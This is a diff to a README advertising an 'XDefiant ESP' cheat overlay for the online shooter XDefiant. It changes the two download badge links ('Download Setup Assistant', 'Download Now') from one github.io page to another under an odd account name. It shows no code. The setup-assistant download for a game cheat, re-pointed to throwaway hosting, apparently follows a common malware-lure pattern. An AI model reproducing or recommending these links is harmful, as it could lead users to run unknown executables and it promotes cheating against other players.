@@ -1,7 +1,7 @@
 # 🎮 XDefiant ESP — Competitive Overlay for Tactical Visibility & Objective Control
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://esp-for-xdefiant.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=ubisoft)](https://esp-for-xdefiant.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://malloriielilwk.github.io/.github/esp-for-xdefiant)  
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=ubisoft)](https://malloriielilwk.github.io/.github/esp-for-xdefiant)
 
 ---
 
